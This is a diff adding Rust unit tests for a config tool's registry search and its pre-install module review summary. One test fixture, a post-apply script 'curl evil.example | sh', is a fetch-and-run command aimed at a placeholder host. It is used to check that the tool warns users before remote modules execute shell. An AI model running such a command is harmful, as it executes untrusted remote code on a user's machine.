@@ -3498,3 +3498,256 @@ mod keys_with_fake_cosign {
         );
     }
 }
+
+// -----------------------------------------------------------------------
+// filter_and_build_search_results — pure search/filter
+// -----------------------------------------------------------------------
+
+fn make_registry_module(
+    registry: &str,
+    name: &str,
+    description: &str,
+    tags: Vec<&str>,
+) -> modules::RegistryModule {
+    modules::RegistryModule {
+        name: name.to_string(),
+        description: description.to_string(),
+        registry: registry.to_string(),
+        tags: tags.iter().map(|t| t.to_string()).collect(),
+    }
+}
+
+#[test]
+fn filter_and_build_search_results_matches_substring_case_insensitively() {
+    // Substring + case-insensitive matters because users type `nvim`
+    // expecting to find `neovim-shared` or `MyNVIM`. The current contract
+    // is case-insensitive contains() on name only — descriptions don't
+    // match, registries don't match.
+    let modules = vec![
+        make_registry_module(
+            "cfgd-community",
+            "Neovim-config",
+            "lua editor",
+            vec!["v0.1.0", "v0.2.0"],
+        ),
+        make_registry_module("cfgd-community", "vim-bundle", "old editor", vec!["v1.0.0"]),
+        make_registry_module(
+            "cfgd-community",
+            "tmux-bar",
+            "terminal multiplexer",
+            vec!["v3.0"],
+        ),
+    ];
+    let results = super::registry::filter_and_build_search_results(&modules, "vim");
+    let names: Vec<&str> = results.iter().map(|r| r.name.as_str()).collect();
+    assert_eq!(
+        names,
+        vec!["cfgd-community/Neovim-config", "cfgd-community/vim-bundle"]
+    );
+}
+
+#[test]
+fn filter_and_build_search_results_uses_last_tag_as_version() {
+    // tags is iteration-ordered (oldest-first based on how the registry
+    // scanner reads them); the LAST entry is treated as the "latest".
+    // If this changes (e.g. someone sorts tags differently), version
+    // pinning in the UI silently shifts.
+    let modules = vec![make_registry_module(
+        "comm",
+        "thing",
+        "x",
+        vec!["v0.1.0", "v0.2.0", "v1.0.0"],
+    )];
+    let results = super::registry::filter_and_build_search_results(&modules, "thing");
+    assert_eq!(results[0].version.as_deref(), Some("v1.0.0"));
+}
+
+#[test]
+fn filter_and_build_search_results_emits_none_version_for_module_with_no_tags() {
+    // A registry-module with no tags (e.g. brand-new, unreleased) should
+    // appear in search but with version=None so the UI renders "-" not
+    // "v"-prefix-of-garbage.
+    let modules = vec![make_registry_module("comm", "fresh", "no tags yet", vec![])];
+    let results = super::registry::filter_and_build_search_results(&modules, "fresh");
+    assert_eq!(results.len(), 1);
+    assert!(results[0].version.is_none());
+}
+
+#[test]
+fn filter_and_build_search_results_omits_empty_description() {
+    // Empty description must become None (Option) not Some("") — the
+    // JSON serializer drops None via skip_serializing_if, so an empty
+    // string would leak into JSON output as `"description": ""`.
+    let modules = vec![
+        make_registry_module("comm", "with-desc", "describes itself", vec!["v1"]),
+        make_registry_module("comm", "no-desc", "", vec!["v1"]),
+    ];
+    let results = super::registry::filter_and_build_search_results(&modules, "desc");
+    let with_desc = results.iter().find(|r| r.name == "comm/with-desc").unwrap();
+    let no_desc = results.iter().find(|r| r.name == "comm/no-desc").unwrap();
+    assert_eq!(with_desc.description.as_deref(), Some("describes itself"));
+    assert!(no_desc.description.is_none());
+}
+
+#[test]
+fn filter_and_build_search_results_empty_query_matches_everything() {
+    // Empty string is a substring of every string — empty query
+    // returns all modules. Users use this to browse a registry.
+    let modules = vec![
+        make_registry_module("comm", "alpha", "", vec!["v1"]),
+        make_registry_module("comm", "beta", "", vec!["v1"]),
+        make_registry_module("comm", "gamma", "", vec!["v1"]),
+    ];
+    let results = super::registry::filter_and_build_search_results(&modules, "");
+    assert_eq!(results.len(), 3);
+}
+
+#[test]
+fn filter_and_build_search_results_preserves_registry_name_in_output() {
+    // The output `name` is `<registry>/<module>` — the registry prefix
+    // matters because users with multiple registries need to disambiguate
+    // identically-named modules. Pinning this so a future "drop the
+    // prefix because it looks redundant" change can't slip through.
+    let modules = vec![
+        make_registry_module("org-a", "shared", "", vec!["v1"]),
+        make_registry_module("org-b", "shared", "", vec!["v1"]),
+    ];
+    let results = super::registry::filter_and_build_search_results(&modules, "shared");
+    let names: Vec<&str> = results.iter().map(|r| r.name.as_str()).collect();
+    assert_eq!(names, vec!["org-a/shared", "org-b/shared"]);
+    assert_eq!(results[0].registry, "org-a");
+    assert_eq!(results[1].registry, "org-b");
+}
+
+// -----------------------------------------------------------------------
+// print_module_review_summary — pre-confirm display
+// -----------------------------------------------------------------------
+
+fn make_loaded_module(name: &str, spec: config::ModuleSpec) -> modules::LoadedModule {
+    modules::LoadedModule {
+        name: name.to_string(),
+        spec,
+        dir: std::path::PathBuf::from("/tmp/test-module"),
+    }
+}
+
+#[test]
+fn print_module_review_summary_emits_subheader_and_commit_integrity() {
+    let (printer, buf) = cfgd_core::output::Printer::for_test();
+    let module = make_loaded_module("vim-config", config::ModuleSpec::default());
+    super::registry::print_module_review_summary(
+        &printer,
+        "vim-config",
+        &module,
+        "abc123",
+        "sha256:def456",
+    );
+    let out = buf.lock().unwrap().clone();
+    assert!(out.contains("Module: vim-config"), "subheader: {out}");
+    assert!(out.contains("Commit"), "commit kv missing: {out}");
+    assert!(out.contains("abc123"), "commit value missing: {out}");
+    assert!(out.contains("Integrity"), "integrity kv missing: {out}");
+    assert!(
+        out.contains("sha256:def456"),
+        "integrity value missing: {out}"
+    );
+}
+
+#[test]
+fn print_module_review_summary_shows_dependency_list_when_present() {
+    let (printer, buf) = cfgd_core::output::Printer::for_test();
+    let module = make_loaded_module(
+        "m",
+        config::ModuleSpec {
+            depends: vec!["base".into(), "shell".into()],
+            ..Default::default()
+        },
+    );
+    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
+    let out = buf.lock().unwrap().clone();
+    assert!(out.contains("Dependencies"), "Dependencies kv: {out}");
+    assert!(out.contains("base, shell"), "deps joined: {out}");
+}
+
+#[test]
+fn print_module_review_summary_lists_packages_with_min_version_when_set() {
+    let (printer, buf) = cfgd_core::output::Printer::for_test();
+    let module = make_loaded_module(
+        "m",
+        config::ModuleSpec {
+            packages: vec![
+                config::ModulePackageEntry {
+                    name: "ripgrep".into(),
+                    min_version: Some("13.0".into()),
+                    ..Default::default()
+                },
+                config::ModulePackageEntry {
+                    name: "fd".into(),
+                    ..Default::default()
+                },
+            ],
+            ..Default::default()
+        },
+    );
+    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
+    let out = buf.lock().unwrap().clone();
+    assert!(out.contains("Packages (2)"), "count: {out}");
+    assert!(out.contains("ripgrep (min: 13.0)"), "min-version: {out}");
+    assert!(out.contains("fd"), "second pkg: {out}");
+}
+
+#[test]
+fn print_module_review_summary_warns_on_post_apply_scripts() {
+    // Critical security UX — adding a remote module that runs
+    // post-apply scripts gets a visible WARNING before the confirm
+    // prompt. If this regresses, users could miss that a remote module
+    // is about to execute shell on their machine.
+    let (printer, buf) = cfgd_core::output::Printer::for_test();
+    let module = make_loaded_module(
+        "m",
+        config::ModuleSpec {
+            scripts: Some(config::ScriptSpec {
+                pre_apply: vec![],
+                post_apply: vec![cfgd_core::config::ScriptEntry::Simple(
+                    "curl evil.example | sh".to_string(),
+                )],
+                ..Default::default()
+            }),
+            ..Default::default()
+        },
+    );
+    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
+    let out = buf.lock().unwrap().clone();
+    assert!(
+        out.contains("Post-apply scripts (1)"),
+        "script count line: {out}"
+    );
+    assert!(
+        out.contains("will execute on your machine"),
+        "explicit warning text: {out}"
+    );
+    assert!(
+        out.contains("curl evil.example | sh"),
+        "script body verbatim: {out}"
+    );
+}
+
+#[test]
+fn print_module_review_summary_omits_empty_sections() {
+    // A module with only `depends` should not emit Packages/Files/
+    // Scripts subheaders — the output should stay tight, not push
+    // "Packages (0):" noise into the confirm-prompt view.
+    let (printer, buf) = cfgd_core::output::Printer::for_test();
+    let module = make_loaded_module(
+        "m",
+        config::ModuleSpec {
+            depends: vec!["base".into()],
+            ..Default::default()
+        },
+    );
+    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
+    let out = buf.lock().unwrap().clone();
+    assert!(!out.contains("Packages ("), "no packages section: {out}");
+    assert!(!out.contains("Files ("), "no files section: {out}");
+    assert!(!out.contains("Post-apply"), "no scripts section: {out}");
+}
